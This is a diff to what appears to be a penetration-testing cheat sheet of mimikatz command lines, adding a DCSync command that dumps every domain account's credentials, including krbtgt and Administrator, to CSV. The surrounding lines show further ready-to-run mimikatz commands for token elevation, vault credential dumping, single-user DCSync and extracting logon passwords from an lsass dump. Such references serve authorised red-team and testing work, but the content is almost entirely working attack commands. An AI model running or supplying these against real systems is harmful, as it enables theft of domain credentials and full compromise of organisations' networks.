@@ -30,6 +30,12 @@ mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"
 mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain> /user:<user>" "exit"
 ```
 
+
+## mimikatz - dcsync - all (krbtgt/Administrator)
+```
+mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain> /all /csv" "exit"
+```
+
 ## mimikatz - extract credentials from dump
 ```
 mimikatz.exe "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords /all" "exit"
